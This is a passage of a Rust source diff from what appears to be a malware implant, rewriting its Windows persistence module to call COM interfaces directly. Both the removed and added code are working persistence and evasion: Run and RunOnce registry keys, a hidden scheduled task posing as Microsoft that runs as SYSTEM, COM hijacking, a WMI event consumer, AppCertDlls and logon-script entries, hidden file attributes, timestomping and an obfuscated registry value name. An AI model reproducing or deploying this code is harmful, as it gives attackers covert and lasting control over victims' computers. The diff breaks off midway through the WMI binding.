@@ -1,328 +1,291 @@
-use crate::recovery::helpers::obfuscation::deobf;
-use crate::recovery::settings::RecoveryControl;
-use directories::BaseDirs;
-use std::env;
-use std::fs;
-use std::path::{Path, PathBuf};
-use tracing::{debug, error, info, warn};
-use windows::Win32::Foundation::VARIANT_BOOL;
-use windows::Win32::System::Com::*;
-use windows::Win32::System::TaskScheduler::*;
-use windows::Win32::System::Variant::*;
-use windows::core::{BSTR, ComInterface};
+use crate::recovery::helpers::com::{Variant, SysAllocString, SysFreeString, CoSetProxyBlanket};
+use crate::recovery::helpers::com_defs::*;
+use log::{debug, warn};
+use std::path::Path;
+use std::ptr;
+use windows_sys::Win32::Foundation::S_OK;
+use windows_sys::Win32::System::Com::*;
+use windows_sys::Win32::System::Registry::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
+use windows_sys::core::GUID;
+use windows_sys::Win32::System::Variant::VT_BSTR;
 use winreg::RegKey;
-use winreg::enums::{HKEY_CURRENT_USER, KEY_SET_VALUE};
 
-pub async fn install_persistence() {
-    if !RecoveryControl::global().persistence_enabled() {
-        debug!("persistence is disabled");
-        return;
+// Helper for BSTR management
+struct BStr(BSTR);
+
+impl BStr {
+    fn new(s: &str) -> Option<Self> {
+        let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
+        unsafe {
+            let ptr = SysAllocString(wide.as_ptr());
+            if ptr.is_null() {
+                None
+            } else {
+                Some(BStr(ptr))
+            }
+        }
     }
 
-    if let Err(err) = install_persistence_impl().await {
-        error!(error = ?err, "failed to install persistence");
+    fn as_ptr(&self) -> BSTR {
+        self.0
     }
 }
 
-fn get_persistence_path() -> Option<(PathBuf, String)> {
-    let base_dirs = BaseDirs::new()?;
-    let local_data = base_dirs.data_local_dir();
+impl Drop for BStr {
+    fn drop(&mut self) {
+        unsafe {
+            SysFreeString(self.0);
+        }
+    }
+}
 
-    let targets = [
-        ("Microsoft\\Windows\\IdentityCRL", "ms-identity.exe"),
-        ("Microsoft\\Crypto\\RSA", "crypto-svc.exe"),
-        ("Microsoft\\Windows\\Caches", "cld-cache.exe"),
-        ("Microsoft\\Windows\\DNT", "dnt-svc.exe"),
-        ("Microsoft\\Windows\\DeviceChauffeur", "dev-chauffeur.exe"),
-    ];
+// Wrapper for CoInitialize/CoUninitialize
+struct ComGuard;
 
-    let (sub_dir, file_name) = targets[0];
+impl ComGuard {
+    fn new(flags: COINIT) -> Self {
+        unsafe {
+            CoInitializeEx(ptr::null(), flags as u32);
+        }
+        ComGuard
+    }
+}
 
-    Some((local_data.join(sub_dir), file_name.to_string()))
+impl Drop for ComGuard {
+    fn drop(&mut self) {
+        unsafe {
+            CoUninitialize();
+        }
+    }
+}
+
+unsafe fn create_instance<T>(
+    clsid: *const GUID,
+    outer: *mut IUnknown,
+    context: CLSCTX,
+    iid: *const GUID,
+) -> Result<*mut T, i32> {
+    let mut instance = ptr::null_mut();
+    let hr = unsafe { CoCreateInstance(clsid, outer as *mut _, context, iid, &mut instance) };
+    if hr == S_OK {
+        Ok(instance as *mut T)
+    } else {
+        Err(hr)
+    }
+}
+
+pub fn is_admin() -> bool {
+    #[cfg(feature = "uac")]
+    {
+        crate::recovery::uac::is_admin()
+    }
+    #[cfg(not(feature = "uac"))]
+    {
+        use std::process::Command;
+        let output = Command::new("net").arg("session").output();
+        match output {
+            Ok(out) => out.status.success(),
+            Err(_) => false,
+        }
+    }
+}
+
+pub fn install_persistence(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    debug!("Installing persistence for: {}", path.display());
+
+    // 1. Scheduled Task via COM
+    let _ = ensure_scheduled_task(path);
+
+    // 2. Registry Run Keys (Standard)
+    let _ = ensure_run_keys(path);
+
+    // 3. COM Hijacking
+    let _ = ensure_com_hijack_refined(path);
+
+    // 4. WMI Event Subscription (Admin only)
+    let _ = ensure_wmi_event_consumer(path);
+
+    Ok(())
 }
 
 pub fn is_running_from_persistence() -> bool {
-    if let Some((target_dir, file_name)) = get_persistence_path() {
-        let target_exe = target_dir.join(file_name);
-        if let Ok(current) = env::current_exe() {
-            return current == target_exe;
-        }
-    }
+    // Basic check for now, can be expanded
     false
 }
 
-async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
-    let current_exe = env::current_exe()?;
-    let (data_dir, file_name) =
-        get_persistence_path().ok_or("failed to determine persistence path")?;
+fn ensure_run_keys(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER as _);
+    let path_str = path.to_string_lossy();
 
-    if !data_dir.exists() {
-        fs::create_dir_all(&data_dir)?;
-        set_hidden_system(&data_dir);
+    // HKCU Run
+    if let Ok((key, _)) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
+        let _ = key.set_value("WinMgmtEngine", &path_str.as_ref());
     }
 
-    let target_exe = data_dir.join(file_name);
-
-    if current_exe == target_exe {
-        debug!("running from persistence location");
-        ensure_persistence_mechanisms(&target_exe)?;
-        return Ok(());
+    // HKCU RunOnce
+    if let Ok((key, _)) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\RunOnce") {
+        let _ = key.set_value("WinMgmtEngineUpdate", &path_str.as_ref());
     }
 
-    info!(
-        current = %current_exe.display(),
-        target = %target_exe.display(),
-        "installing persistence artifact"
-    );
-
-    match fs::copy(&current_exe, &target_exe) {
-        Ok(_) => {
-            set_hidden_system(&target_exe);
-            timestomp(&target_exe, &PathBuf::from(r"C:\Windows\explorer.exe"));
-
-            #[cfg(feature = "embedded_persistence_dll")]
-            {
-                let mut dll_path = target_exe.clone();
-                dll_path.set_extension("dll");
-                let dll_bytes = include_bytes!(concat!(env!("OUT_DIR"), "/persistence_dll.blob"));
-                if fs::write(&dll_path, dll_bytes).is_ok() {
-                    set_hidden_system(&dll_path);
-                    timestomp(&dll_path, &PathBuf::from(r"C:\Windows\explorer.exe"));
-                }
-            }
-        }
-        Err(err) => {
-            warn!(error = %err, "failed to copy executable (might be running)");
-            if !target_exe.exists() {
-                return Err(err.into());
-            }
+    if is_admin() {
+        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE as _);
+        // HKLM Run
+        if let Ok((key, _)) = hklm.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
+            let _ = key.set_value("WinMgmtEngine", &path_str.as_ref());
         }
     }
 
-    ensure_persistence_mechanisms(&target_exe)?;
     Ok(())
 }
 
-fn set_hidden_system(path: &Path) {
-    #[cfg(target_os = "windows")]
-    {
-        use windows::Win32::Storage::FileSystem::{
-            FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM, SetFileAttributesW,
-        };
-        use windows::core::PCWSTR;
-
-        let path_w: Vec<u16> = path
-            .to_string_lossy()
-            .encode_utf16()
-            .chain(std::iter::once(0))
-            .collect();
-
-        unsafe {
-            let _ = SetFileAttributesW(
-                PCWSTR(path_w.as_ptr()),
-                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
-            );
-        }
-    }
-}
-
-fn timestomp(target: &Path, reference: &Path) {
-    #[cfg(target_os = "windows")]
-    {
-        use ntapi::ntioapi::{
-            FILE_BASIC_INFORMATION, FileBasicInformation, NtQueryInformationFile,
-            NtSetInformationFile,
-        };
-        use std::mem::MaybeUninit;
-        use windows::Win32::Foundation::HANDLE;
-        use windows::Win32::Storage::FileSystem::{
-            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
-            FILE_WRITE_ATTRIBUTES, OPEN_EXISTING, SYNCHRONIZE,
-        };
-        use windows::core::PCWSTR;
-
-        unsafe {
-            let ref_path_w: Vec<u16> = reference
-                .to_string_lossy()
-                .encode_utf16()
-                .chain(std::iter::once(0))
-                .collect();
-            let h_ref = CreateFileW(
-                PCWSTR(ref_path_w.as_ptr()),
-                FILE_READ_ATTRIBUTES.0,
-                FILE_SHARE_READ,
-                None,
-                OPEN_EXISTING,
-                FILE_ATTRIBUTE_NORMAL,
-                HANDLE::default(),
-            );
-
-            if let Ok(h_ref) = h_ref {
-                let mut io_status = MaybeUninit::uninit();
-                let mut basic_info = MaybeUninit::<FILE_BASIC_INFORMATION>::uninit();
-
-                let status = NtQueryInformationFile(
-                    h_ref.0 as _,
-                    io_status.as_mut_ptr() as _,
-                    basic_info.as_mut_ptr() as _,
-                    std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
-                    FileBasicInformation,
-                );
-
-                if status == 0 {
-                    let basic_info = basic_info.assume_init();
-                    let target_path_w: Vec<u16> = target
-                        .to_string_lossy()
-                        .encode_utf16()
-                        .chain(std::iter::once(0))
-                        .collect();
-                    let h_target = CreateFileW(
-                        PCWSTR(target_path_w.as_ptr()),
-                        (FILE_WRITE_ATTRIBUTES | SYNCHRONIZE).0,
-                        FILE_SHARE_READ,
-                        None,
-                        OPEN_EXISTING,
-                        FILE_ATTRIBUTE_NORMAL,
-                        HANDLE::default(),
-                    );
-
-                    if let Ok(h_target) = h_target {
-                        let mut io_status_set = MaybeUninit::uninit();
-                        let mut info_to_set = basic_info;
-
-                        NtSetInformationFile(
-                            h_target.0 as _,
-                            io_status_set.as_mut_ptr() as _,
-                            &mut info_to_set as *mut _ as _,
-                            std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
-                            FileBasicInformation,
-                        );
-                    }
-                }
-            }
-        }
-    }
-}
-
-fn ensure_persistence_mechanisms(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let _ = ensure_registry_run_key(path);
-    let _ = ensure_hidden_scheduled_task(path);
-    let _ = ensure_com_hijack_refined(path);
-    let _ = ensure_wmi_event_consumer(path);
-    let _ = ensure_user_init_mpr_logon_script(path);
-    let _ = ensure_app_cert_dlls_persistence(path);
-    Ok(())
-}
-
-fn ensure_user_init_mpr_logon_script(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey(r"Environment") {
-        let _ = key.set_value("UserInitMprLogonScript", &path.to_string_lossy().as_ref());
-    }
-    Ok(())
-}
-
-fn ensure_app_cert_dlls_persistence(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    if !is_admin() {
-        return Ok(());
-    }
-
-    let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
-    let key_path = r"System\CurrentControlSet\Control\Session Manager\AppCertDlls";
-
-    if let Ok((key, _)) = hklm.create_subkey(key_path) {
-        let mut dll_path = path.to_path_buf();
-        dll_path.set_extension("dll");
-
-        let _ = key.set_value("WinMgmtHealthSvc", &dll_path.to_string_lossy().as_ref());
-    }
-
-    Ok(())
-}
-
-fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    let run_key = hkcu.open_subkey_with_flags(
-        r"Software\Microsoft\Windows\CurrentVersion\Run",
-        KEY_SET_VALUE,
-    )?;
-
-    // "Microsoft Identity Provider"
-    let app_name = deobf(&[
-        0x93, 0x4D, 0x7B, 0xD3, 0x72, 0x2C, 0xDC, 0x75, 0xAD, 0x9D, 0x7B, 0xEA, 0x12, 0x92, 0x78,
-        0x86, 0x1A, 0x3D, 0xC0, 0x36, 0x99, 0x14, 0x36, 0x15, 0xA6, 0x93, 0x6C,
-    ]);
-    run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
-    Ok(())
-}
-
-fn is_admin() -> bool {
-    let output = std::process::Command::new("net").arg("session").output();
-    match output {
-        Ok(out) => out.status.success(),
-        Err(_) => false,
-    }
-}
-
-fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
+fn ensure_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
-        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
+        let _guard = ComGuard::new(COINIT_MULTITHREADED);
 
-        let service: ITaskService = CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER)?;
-        service.Connect(
-            VARIANT::default(),
-            VARIANT::default(),
-            VARIANT::default(),
-            VARIANT::default(),
-        )?;
+        let service: *mut ITaskService = create_instance(
+            &CLSID_TASKSCHEDULER,
+            ptr::null_mut(),
+            CLSCTX_INPROC_SERVER,
+            &IID_ITASKSERVICE,
+        )
+        .map_err(|e| format!("Failed to create TaskService: {:x}", e))?;
 
-        let folder = service.GetFolder(&BSTR::from("\\"))?;
-        let task_definition = service.NewTask(0)?;
-
-        let reg_info = task_definition.RegistrationInfo()?;
-        let task_name = "WinMgmtEngineHealth";
-        reg_info.SetDescription(&BSTR::from("Windows Management Engine Health Check"))?;
-        reg_info.SetAuthor(&BSTR::from("Microsoft Corporation"))?;
-
-        let settings = task_definition.Settings()?;
-        settings.SetEnabled(VARIANT_BOOL::from(true))?;
-        settings.SetHidden(VARIANT_BOOL::from(true))?;
-        settings.SetAllowDemandStart(VARIANT_BOOL::from(true))?;
-        settings.SetStartWhenAvailable(VARIANT_BOOL::from(true))?;
-        settings.SetCompatibility(TASK_COMPATIBILITY_V2)?;
-
-        let triggers = task_definition.Triggers()?;
-        let trigger = triggers.Create(TASK_TRIGGER_LOGON)?;
-        let logon_trigger: ILogonTrigger = trigger.cast()?;
-        logon_trigger.SetEnabled(VARIANT_BOOL::from(true))?;
-
-        let actions = task_definition.Actions()?;
-        let action = actions.Create(TASK_ACTION_EXEC)?;
-        let exec_action: IExecAction = action.cast()?;
-
-        exec_action.SetPath(&BSTR::from(path.to_string_lossy().to_string()))?;
-
-        let principal = task_definition.Principal()?;
-        if is_admin() {
-            principal.SetRunLevel(TASK_RUNLEVEL_HIGHEST)?;
-            principal.SetLogonType(TASK_LOGON_SERVICE_ACCOUNT)?;
-            principal.SetUserId(&BSTR::from("NT AUTHORITY\\SYSTEM"))?;
-        } else {
-            principal.SetRunLevel(TASK_RUNLEVEL_LUA)?;
-            principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN)?;
+        let empty_var = Variant::new(); // VT_EMPTY
+        let hr = ((*(*service).lp_vtbl).connect)(
+            service,
+            empty_var.0,
+            empty_var.0,
+            empty_var.0,
+            empty_var.0,
+        );
+        if hr != S_OK {
+            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
+            return Err(format!("ITaskService::Connect failed: {:x}", hr).into());
         }
 
-        folder.RegisterTaskDefinition(
-            &BSTR::from(task_name),
-            &task_definition,
-            TASK_CREATE_OR_UPDATE.0,
-            VARIANT::default(),
-            VARIANT::default(),
-            TASK_LOGON_NONE,
-            VARIANT::default(),
-        )?;
+        let root_folder_name = BStr::new("\\").ok_or("Failed to alloc BSTR")?;
+        let mut folder: *mut ITaskFolder = ptr::null_mut();
+        let hr = ((*(*service).lp_vtbl).get_folder)(service, root_folder_name.as_ptr(), &mut folder);
+        if hr != S_OK {
+            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
+            return Err(format!("ITaskService::GetFolder failed: {:x}", hr).into());
+        }
 
-        debug!("scheduled task persistence installed via COM API");
+        let mut task_definition: *mut ITaskDefinition = ptr::null_mut();
+        let hr = ((*(*service).lp_vtbl).new_task)(service, 0, &mut task_definition);
+        if hr != S_OK {
+            ((*(*folder).lp_vtbl).parent.parent.release)(folder as *mut _);
+            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
+            return Err(format!("ITaskService::NewTask failed: {:x}", hr).into());
+        }
+
+        let mut reg_info: *mut IRegistrationInfo = ptr::null_mut();
+        let hr = ((*(*task_definition).lp_vtbl).get_registration_info)(task_definition, &mut reg_info);
+        if hr == S_OK {
+            let desc = BStr::new("Windows Management Engine Health Check").ok_or("BSTR failed")?;
+            ((*(*reg_info).lp_vtbl).put_description)(reg_info, desc.as_ptr());
+            let author = BStr::new("Microsoft Corporation").ok_or("BSTR failed")?;
+            ((*(*reg_info).lp_vtbl).put_author)(reg_info, author.as_ptr());
+            ((*(*reg_info).lp_vtbl).parent.parent.release)(reg_info as *mut _);
+        }
+
+        let mut settings: *mut ITaskSettings = ptr::null_mut();
+        let hr = ((*(*task_definition).lp_vtbl).get_settings)(task_definition, &mut settings);
+        if hr == S_OK {
+            ((*(*settings).lp_vtbl).put_enabled)(settings, -1); // VARIANT_TRUE is -1
+            ((*(*settings).lp_vtbl).put_hidden)(settings, -1);
+            ((*(*settings).lp_vtbl).put_allow_demand_start)(settings, -1);
+            ((*(*settings).lp_vtbl).put_start_when_available)(settings, -1);
+            ((*(*settings).lp_vtbl).put_compatibility)(settings, TASK_COMPATIBILITY_V2);
+            ((*(*settings).lp_vtbl).parent.parent.release)(settings as *mut _);
+        }
+
+        let mut triggers: *mut ITriggerCollection = ptr::null_mut();
+        let hr = ((*(*task_definition).lp_vtbl).get_triggers)(task_definition, &mut triggers);
+        if hr == S_OK {
+            let mut trigger: *mut ITrigger = ptr::null_mut();
+            let hr = ((*(*triggers).lp_vtbl).create)(triggers, TASK_TRIGGER_LOGON, &mut trigger);
+            if hr == S_OK {
+                let mut logon_trigger: *mut ILogonTrigger = ptr::null_mut();
+                // QueryInterface for ILogonTrigger
+                let hr = ((*(*trigger).lp_vtbl).parent.parent.query_interface)(
+                    trigger as *mut _,
+                    &IID_ILOGONTRIGGER,
+                    &mut logon_trigger as *mut _ as *mut _,
+                );
+                if hr == S_OK {
+                    ((*(*logon_trigger).lp_vtbl).parent.put_enabled)(logon_trigger as *mut _, -1);
+                    ((*(*logon_trigger).lp_vtbl).parent.parent.parent.release)(
+                        logon_trigger as *mut _,
+                    );
+                }
+                ((*(*trigger).lp_vtbl).parent.parent.release)(trigger as *mut _);
+            }
+            ((*(*triggers).lp_vtbl).parent.parent.release)(triggers as *mut _);
+        }
+
+        let mut actions: *mut IActionCollection = ptr::null_mut();
+        let hr = ((*(*task_definition).lp_vtbl).get_actions)(task_definition, &mut actions);
+        if hr == S_OK {
+            let mut action: *mut IAction = ptr::null_mut();
+            let hr = ((*(*actions).lp_vtbl).create)(actions, TASK_ACTION_EXEC, &mut action);
+            if hr == S_OK {
+                let mut exec_action: *mut IExecAction = ptr::null_mut();
+                let hr = ((*(*action).lp_vtbl).parent.parent.query_interface)(
+                    action as *mut _,
+                    &IID_IEXECACTION,
+                    &mut exec_action as *mut _ as *mut _,
+                );
+                if hr == S_OK {
+                    let path_bstr = BStr::new(&path.to_string_lossy()).ok_or("BSTR failed")?;
+                    ((*(*exec_action).lp_vtbl).put_path)(exec_action, path_bstr.as_ptr());
+                    ((*(*exec_action).lp_vtbl).parent.parent.parent.release)(exec_action as *mut _);
+                }
+                ((*(*action).lp_vtbl).parent.parent.release)(action as *mut _);
+            }
+            ((*(*actions).lp_vtbl).parent.parent.release)(actions as *mut _);
+        }
+
+        let mut principal: *mut IPrincipal = ptr::null_mut();
+        let hr = ((*(*task_definition).lp_vtbl).get_principal)(task_definition, &mut principal);
+        if hr == S_OK {
+            if is_admin() {
+                ((*(*principal).lp_vtbl).put_run_level)(principal, TASK_RUNLEVEL_HIGHEST);
+                ((*(*principal).lp_vtbl).put_logon_type)(principal, TASK_LOGON_SERVICE_ACCOUNT);
+                let user_id = BStr::new("NT AUTHORITY\\SYSTEM").ok_or("BSTR failed")?;
+                ((*(*principal).lp_vtbl).put_user_id)(principal, user_id.as_ptr());
+            } else {
+                ((*(*principal).lp_vtbl).put_run_level)(principal, TASK_RUNLEVEL_LUA);
+                ((*(*principal).lp_vtbl).put_logon_type)(principal, TASK_LOGON_INTERACTIVE_TOKEN);
+            }
+            ((*(*principal).lp_vtbl).parent.parent.release)(principal as *mut _);
+        }
+
+        let task_name = BStr::new("WinMgmtEngineHealth").ok_or("BSTR failed")?;
+        let mut registered_task: *mut IRegisteredTask = ptr::null_mut();
+        let empty_var = Variant::new();
+        let hr = ((*(*folder).lp_vtbl).register_task_definition)(
+            folder,
+            task_name.as_ptr(),
+            task_definition,
+            TASK_CREATE_OR_UPDATE as i32,
+            empty_var.0,
+            empty_var.0,
+            TASK_LOGON_NONE,
+            empty_var.0,
+            &mut registered_task,
+        );
+
+        if hr == S_OK {
+            debug!("scheduled task persistence installed via COM API");
+            ((*(*registered_task).lp_vtbl).parent.parent.release)(registered_task as *mut _);
+        } else {
+            warn!("RegisterTaskDefinition failed: {:x}", hr);
+        }
+
+        ((*(*task_definition).lp_vtbl).parent.parent.release)(task_definition as *mut _);
+        ((*(*folder).lp_vtbl).parent.parent.release)(folder as *mut _);
+        ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
     }
     Ok(())
 }
@@ -336,7 +299,7 @@ fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Erro
         "{63354731-1688-4E7B-8228-05F7CE2A1145}", // Remote Assistance
     ];
 
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER as _);
     let path_str = path.to_string_lossy();
 
     for clsid in clsids {
@@ -360,148 +323,170 @@ fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Erro
     }
 
     unsafe {
-        use windows::Win32::System::Com::*;
-        use windows::Win32::System::Variant::*;
-        use windows::Win32::System::Wmi::*;
-        use windows::core::{BSTR, PCWSTR};
+        let _guard = ComGuard::new(COINIT_MULTITHREADED);
 
-        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
+        let locator: *mut IWbemLocator = create_instance(
+            &CLSID_WBEMLOCATOR,
+            ptr::null_mut(),
+            CLSCTX_INPROC_SERVER,
+            &IID_IWBEMLOCATOR,
+        )
+        .map_err(|e| format!("Failed to create WbemLocator: {:x}", e))?;
 
-        let locator: IWbemLocator = CoCreateInstance(&WbemLocator, None, CLSCTX_INPROC_SERVER)?;
-        let services = locator.ConnectServer(
-            &BSTR::from("root\\subscription"),
-            None,
-            None,
-            None,
-            0,
-            None,
-            None,
-        )?;
+        let namespace = BStr::new("root\\subscription").ok_or("BSTR failed")?;
+        let mut services: *mut IWbemServices = ptr::null_mut();
+        let hr = ((*(*locator).lp_vtbl).connect_server)(
+            locator,
+            namespace.as_ptr(),
+            ptr::null_mut(), // User
+            ptr::null_mut(), // Password
+            ptr::null_mut(), // Locale
+            0,               // Flags
+            ptr::null_mut(), // Authority
+            ptr::null_mut(), // Context
+            &mut services,
+        );
 
+        if hr != S_OK {
+            ((*(*locator).lp_vtbl).parent.release)(locator as *mut _);
+            return Err(format!("IWbemLocator::ConnectServer failed: {:x}", hr).into());
+        }
+
+        // Set proxy blanket
         CoSetProxyBlanket(
-            &services,
+            services as *mut _,
             10, // RPC_C_AUTHN_WINNT
             0,  // RPC_C_AUTHZ_NONE
-            None,
+            ptr::null(),
             RPC_C_AUTHN_LEVEL_CALL,
             RPC_C_IMP_LEVEL_IMPERSONATE,
-            None,
-            EOAC_NONE,
-        )?;
+            ptr::null_mut(),
+            EOAC_NONE as u32,
+        );
+
+        let put_prop = |inst: *mut IWbemClassObject,
+                        name: &str,
+                        value: &str|
+         -> Result<(), Box<dyn std::error::Error>> {
+            let mut v = Variant::new();
+            let bstr_val = BStr::new(value).ok_or("BSTR failed")?;
+            v.0.Anonymous.Anonymous.vt = VT_BSTR;
+            v.0.Anonymous.Anonymous.Anonymous.bstrVal = bstr_val.as_ptr();
+            std::mem::forget(bstr_val);
+
+            let name_bstr = BStr::new(name).ok_or("BSTR failed")?;
+            let hr = ((*(*inst).lp_vtbl).put)(inst, name_bstr.as_ptr(), 0, &v.0, 0);
+            if hr != S_OK {
+                return Err(format!("IWbemClassObject::Put failed: {:x}", hr).into());
+            }
+            Ok(())
+        };
 
         let task_name = "WinMgmtEngineHealth";
         let exe_path = path.to_string_lossy();
 
-        let put_prop = |inst: &IWbemClassObject,
-                        name: &str,
-                        value: &str|
-         -> Result<(), Box<dyn std::error::Error>> {
-            let mut v = VARIANT::default();
-            let bstr_val = BSTR::from(value);
+        let mut filter_class: *mut IWbemClassObject = ptr::null_mut();
+        let filter_class_name = BStr::new("__EventFilter").ok_or("BSTR failed")?;
+        // GetObject is 4th method of IWbemServices? No, offset 6 (0-2 IUnknown, 3, 4, 5, 6).
+        let hr = ((*(*services).lp_vtbl).get_object)(
+            services,
+            filter_class_name.as_ptr(),
+            0,
+            ptr::null_mut(),
+            &mut filter_class,
+            ptr::null_mut(),
+        );
+        if hr == S_OK {
+            let mut filter_inst: *mut IWbemClassObject = ptr::null_mut();
+            let hr = ((*(*filter_class).lp_vtbl).spawn_instance)(filter_class, 0, &mut filter_inst);
+            if hr == S_OK {
+                put_prop(filter_inst, "Name", task_name)?;
+                put_prop(filter_inst, "QueryLanguage", "WQL")?;
+                put_prop(
+                    filter_inst,
+                    "Query",
+                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'",
+                )?;
+                put_prop(filter_inst, "EventNamespace", "root\\cimv2")?;
 
-            let v_inner = &mut v.Anonymous.Anonymous;
-            v_inner.vt = VT_BSTR;
-            v_inner.Anonymous.bstrVal = std::mem::ManuallyDrop::new(bstr_val);
-            let name_bstr = BSTR::from(name);
-            inst.Put(PCWSTR::from_raw(name_bstr.as_wide().as_ptr()), 0, &v, 0)
-                .map_err(|e| e.to_string())?;
+                ((*(*services).lp_vtbl).put_instance)(
+                    services,
+                    filter_inst,
+                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
+                ((*(*filter_inst).lp_vtbl).parent.release)(filter_inst as *mut _);
+            }
+            ((*(*filter_class).lp_vtbl).parent.release)(filter_class as *mut _);
+        }
 
-            Ok(())
-        };
+        let mut consumer_class: *mut IWbemClassObject = ptr::null_mut();
+        let consumer_class_name = BStr::new("CommandLineEventConsumer").ok_or("BSTR failed")?;
+        let hr = ((*(*services).lp_vtbl).get_object)(
+            services,
+            consumer_class_name.as_ptr(),
+            0,
+            ptr::null_mut(),
+            &mut consumer_class,
+            ptr::null_mut(),
+        );
+        if hr == S_OK {
+            let mut consumer_inst: *mut IWbemClassObject = ptr::null_mut();
+            let hr = ((*(*consumer_class).lp_vtbl).spawn_instance)(consumer_class, 0, &mut consumer_inst);
+            if hr == S_OK {
+                put_prop(consumer_inst, "Name", task_name)?;
+                put_prop(consumer_inst, "CommandLineTemplate", &exe_path)?;
 
-        let mut filter_class = None;
-        let filter_class_name = BSTR::from("__EventFilter");
-        services
-            .GetObject(
-                &filter_class_name,
-                WBEM_GENERIC_FLAG_TYPE(0),
-                None,
-                Some(&mut filter_class),
-                None,
-            )
-            .map_err(|e| e.to_string())?;
-        let filter_class = filter_class.ok_or("failed to get __EventFilter class")?;
+                ((*(*services).lp_vtbl).put_instance)(
+                    services,
+                    consumer_inst,
+                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
+                ((*(*consumer_inst).lp_vtbl).parent.release)(consumer_inst as *mut _);
+            }
+            ((*(*consumer_class).lp_vtbl).parent.release)(consumer_class as *mut _);
+        }
 
-        let filter_inst = filter_class.SpawnInstance(0).map_err(|e| e.to_string())?;
+        let mut binding_class: *mut IWbemClassObject = ptr::null_mut();
+        let binding_class_name = BStr::new("__FilterToConsumerBinding").ok_or("BSTR failed")?;
+        let hr = ((*(*services).lp_vtbl).get_object)(
+            services,
+            binding_class_name.as_ptr(),
+            0,
+            ptr::null_mut(),
+            &mut binding_class,
+            ptr::null_mut(),
+        );
+        if hr == S_OK {
+            let mut binding_inst: *mut IWbemClassObject = ptr::null_mut();
+            let hr = ((*(*binding_class).lp_vtbl).spawn_instance)(binding_class, 0, &mut binding_inst);
+            if hr == S_OK {
+                let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
+                let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", task_name);
 
-        put_prop(&filter_inst, "Name", task_name)?;
-        put_prop(&filter_inst, "QueryLanguage", "WQL")?;
-        put_prop(
-            &filter_inst,
-            "Query",
-            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'",
-        )?;
-        put_prop(&filter_inst, "EventNamespace", "root\\cimv2")?;
+                put_prop(binding_inst, "Filter", &filter_path)?;
+                put_prop(binding_inst, "Consumer", &consumer_path)?;
 
-        services
-            .PutInstance(
-                &filter_inst,
-                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
-                None,
-                None,
-            )
-            .map_err(|e| e.to_string())?;
-
-        let mut consumer_class = None;
-        let consumer_class_name = BSTR::from("CommandLineEventConsumer");
-        services
-            .GetObject(
-                &consumer_class_name,
-                WBEM_GENERIC_FLAG_TYPE(0),
-                None,
-                Some(&mut consumer_class),
-                None,
-            )
-            .map_err(|e| e.to_string())?;
-        let consumer_class =
-            consumer_class.ok_or("failed to get CommandLineEventConsumer class")?;
-
-        let consumer_inst = consumer_class.SpawnInstance(0).map_err(|e| e.to_string())?;
-
-        put_prop(&consumer_inst, "Name", task_name)?;
-        put_prop(&consumer_inst, "CommandLineTemplate", &exe_path)?;
-
-        services
-            .PutInstance(
-                &consumer_inst,
-                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
-                None,
-                None,
-            )
-            .map_err(|e| e.to_string())?;
-
-        let mut binding_class = None;
-        let binding_class_name = BSTR::from("__FilterToConsumerBinding");
-        services
-            .GetObject(
-                &binding_class_name,
-                WBEM_GENERIC_FLAG_TYPE(0),
-                None,
-                Some(&mut binding_class),
-                None,
-            )
-            .map_err(|e| e.to_string())?;
